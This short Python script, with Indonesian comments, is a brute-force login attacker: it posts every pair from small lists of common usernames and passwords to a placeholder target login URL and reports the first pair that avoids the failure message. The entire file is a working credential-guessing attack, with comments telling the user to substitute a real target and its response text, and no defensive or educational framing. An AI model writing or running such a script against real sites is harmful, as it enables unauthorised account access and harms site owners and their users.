import requests

url = "http://target-website.com/login"  # Ganti dengan URL target
usernames = ["admin", "root", "user"]
passwords = ["123456", "password", "admin"]

for user in usernames:
    for pwd in passwords:
        data = {"username": user, "password": pwd}
        response = requests.post(url, data=data)
        if "Login gagal" not in response.text:  # Ubah sesuai respons target
            print(f"[+] Login berhasil! Username: {user}, Password: {pwd}")
            exit()

print("[-] Semua kombinasi gagal")

